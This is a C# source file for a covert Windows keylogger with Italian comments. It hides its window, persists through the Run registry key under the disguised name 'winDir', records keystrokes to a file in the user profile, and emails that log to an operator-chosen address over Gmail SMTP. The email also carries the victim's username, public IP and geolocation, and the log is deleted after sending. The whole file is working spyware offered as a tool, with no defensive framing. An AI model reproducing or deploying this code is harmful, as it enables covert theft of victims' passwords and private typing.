using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

//import classi
using System.IO;
using System.Net.Mail;
using Microsoft.Win32;
using Utilities; //namespace della classe globalKeyboardHook
using System.Net.NetworkInformation;

namespace Keylogger
{
    public partial class keylogger : Form
    {
        bool autorun;
        public keylogger(string from, string to, string user, string password, bool invisible, bool autorun)
        {
            InitializeComponent();
            this.autorun = autorun;
            if (invisible)
            {
                this.Opacity = 0;
                this.ShowInTaskbar = false;
            }

            PingReply reply = new Ping().Send("www.google.com"); //controllo che sia presente la connessione ad internet

            if (reply.Status == IPStatus.Success)
            {
                send_mail(from, to, user, password);
            }


        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (autorun)
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);//autorun di windows


                if (key.GetValue("winDir") == null) //se non è ancora stato inserito nel'autorun ---> inseriscilo
                {
                    key.SetValue("winDir", Application.ExecutablePath.ToString());
                }

            }


            globalKeyboardHook tastiera = new globalKeyboardHook();

            //Tutti i tasti da rilevare
            //tasti 
            tastiera.HookedKeys.Add(Keys.A);
            tastiera.HookedKeys.Add(Keys.B);
            tastiera.HookedKeys.Add(Keys.C);
            tastiera.HookedKeys.Add(Keys.D);
            tastiera.HookedKeys.Add(Keys.E);
            tastiera.HookedKeys.Add(Keys.F);
            tastiera.HookedKeys.Add(Keys.G);
            tastiera.HookedKeys.Add(Keys.H);
            tastiera.HookedKeys.Add(Keys.I);
            tastiera.HookedKeys.Add(Keys.J);
            tastiera.HookedKeys.Add(Keys.K);
            tastiera.HookedKeys.Add(Keys.L);
            tastiera.HookedKeys.Add(Keys.M);
            tastiera.HookedKeys.Add(Keys.N);
            tastiera.HookedKeys.Add(Keys.O);
            tastiera.HookedKeys.Add(Keys.P);
            tastiera.HookedKeys.Add(Keys.Q);
            tastiera.HookedKeys.Add(Keys.R);
            tastiera.HookedKeys.Add(Keys.S);
            tastiera.HookedKeys.Add(Keys.T);
            tastiera.HookedKeys.Add(Keys.U);
            tastiera.HookedKeys.Add(Keys.V);
            tastiera.HookedKeys.Add(Keys.W);
            tastiera.HookedKeys.Add(Keys.X);
            tastiera.HookedKeys.Add(Keys.Y);
            tastiera.HookedKeys.Add(Keys.Z);
            //numeri
            tastiera.HookedKeys.Add(Keys.D0);
            tastiera.HookedKeys.Add(Keys.D1);
            tastiera.HookedKeys.Add(Keys.D2);
            tastiera.HookedKeys.Add(Keys.D3);
            tastiera.HookedKeys.Add(Keys.D4);
            tastiera.HookedKeys.Add(Keys.D5);
            tastiera.HookedKeys.Add(Keys.D6);
            tastiera.HookedKeys.Add(Keys.D7);
            tastiera.HookedKeys.Add(Keys.D8);
            tastiera.HookedKeys.Add(Keys.D9);
            //Caratteri speciali
            tastiera.HookedKeys.Add(Keys.Space);
            tastiera.HookedKeys.Add(Keys.Shift);
            tastiera.HookedKeys.Add(Keys.ShiftKey);
            tastiera.HookedKeys.Add(Keys.Enter);
            tastiera.HookedKeys.Add(Keys.CapsLock);
            tastiera.HookedKeys.Add(Keys.Cancel);
            tastiera.HookedKeys.Add(Keys.Delete);
            tastiera.HookedKeys.Add(Keys.CapsLock);
            tastiera.HookedKeys.Add(Keys.LShiftKey);
            tastiera.HookedKeys.Add(Keys.RShiftKey);

            tastiera.KeyDown += new KeyEventHandler(tasto_premuto);
        }
        private void tasto_premuto(object o, KeyEventArgs key)
        {
            string path = Environment.GetEnvironmentVariable("USERPROFILE") + "\\logs.txt";
            String tasto = key.KeyCode.ToString();
            switch (tasto)
            {
                case "D0":
                    tasto = "0";
                    break;
                case "D1":
                    tasto = "1";
                    break;
                case "D2":
                    tasto = "2";
                    break;
                case "D3":
                    tasto = "3";
                    break;
                case "D4":
                    tasto = "4";
                    break;
                case "D5":
                    tasto = "5";
                    break;
                case "D6":
                    tasto = "6";
                    break;
                case "D7":
                    tasto = "7";
                    break;
                case "D8":
                    tasto = "8";
                    break;
                case "Space":
                    tasto = " ";
                    break;
                case "Enter":
                    tasto = "\n";
                    break;
                case "Cancel":
                    tasto = "<CANCEL>";
                    break;
                case "CapsLock":
                    tasto = "<CAPS LOCK>";
                    break;
                case "ShiftKey":
                    tasto = "<SHIFT>";
                    break;
                case "LShiftKey":
                    tasto = "<SHIFT>";
                    break;
                case "RShiftKey":
                    tasto = "<SHIFT>";
                    break;
                case "Shift":
                    tasto = "<SHIFT>";
                    break;


            }

            File.AppendAllText(path, tasto); //scrivi sul file di testo


        }
        private void send_mail(string from, string to, string user, string password)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com");
                server.EnableSsl = true;
                mail.From = new MailAddress(from);
                mail.To.Add(to);
                string username = Environment.GetEnvironmentVariable("USERNAME");
                mail.Subject = username + " logs";
                /*corpo del messaggio, composto da:
                 * 
                 * * * * * * * * * * * 
                 * nome utente       *
                 * ip                *
                 * data              *
                 * geolocalization   *
                 * * * * * * * * * * *
                 * 
                 */

                //nome utente
                mail.Body = "Name: " + username;
                //data

                mail.Body += "\nDate: " + DateTime.Now.ToString("g");
                //ip
                string ipPubblico = new System.Net.WebClient().DownloadString("http://icanhazip.com");
                mail.Body += "\nPublic ip: " + ipPubblico + "\n";
                //geolocalization
                string geo = "http://ip-api.com/json/" + ipPubblico;
                string geolocalization = new System.Net.WebClient().DownloadString(geo);
                string[] array = geolocalization.Split(',');
                for (int i = 0; i < array.Length; i++)
                {
                    string temp = array[i] + "\n";
                    temp = temp.Replace('"', ' ');
                    temp = temp.Replace('}', ' ');
                    temp = temp.Replace('{', ' ');
                    mail.Body += temp;
                }

                string path = Environment.GetEnvironmentVariable("USERPROFILE") + "\\logs.txt";
                System.Net.Mail.Attachment allegato = new System.Net.Mail.Attachment(path);
                server.DeliveryMethod = SmtpDeliveryMethod.Network;
                mail.Attachments.Add(allegato);

                server.Port = 587;
                server.Credentials = new System.Net.NetworkCredential(user, password);
                server.Send(mail);

                //chiusura ed eliminazione file "logs.txt"
                allegato.Dispose();
                server.Dispose();
                File.Delete(path);
            }
            catch (Exception e) { }





        }
    }
}
